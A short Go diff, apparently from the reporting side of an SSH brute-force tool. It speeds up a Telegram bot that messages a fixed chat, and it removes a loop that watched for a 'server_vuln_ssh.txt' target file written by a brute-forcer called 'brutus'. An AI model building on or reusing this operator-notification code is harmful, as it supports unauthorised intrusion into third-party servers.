@@ -6,7 +6,7 @@ import (
 	"net/http"
         "fmt"
        "time"
-      "os"
+     
       
 
 
@@ -24,8 +24,7 @@ func bot(msg string ) {
 
 
 
-
-      time.Sleep  ( 30     *  time.Second)  //evite    too many requests 
+      time.Sleep  ( 1     *  time.Second)  //evite    too many requests 
 
 
 
@@ -40,7 +39,7 @@ func bot(msg string ) {
 
 		"chat_id": "7127446120",
 
-		"text":    msg  , 
+		"text":    msg , 
 
 
 	}
@@ -75,35 +74,7 @@ func bot(msg string ) {
 
 
 
-     //essa funcao vai verifica em um lopp infinito  o arquivo  server_vuln_ssh.txt  que sera gerado pelo  brutus em  caso
-     //dele  te sucesso na busca de alvos 
-
-
-
-
-
-func  verify_ips_ssh_by_brutus(){
-
-
-
-filename := "server_vuln_ssh.txt"
-
-
-for {
-
-ptr ,  err_op := os.Open("/var/tmp/" +  filename )
-
- if err_op != nil { continue }
-
- fmt.Println(ptr)
-
-
-
-}
-
-
-}
-
+   
 
 
 
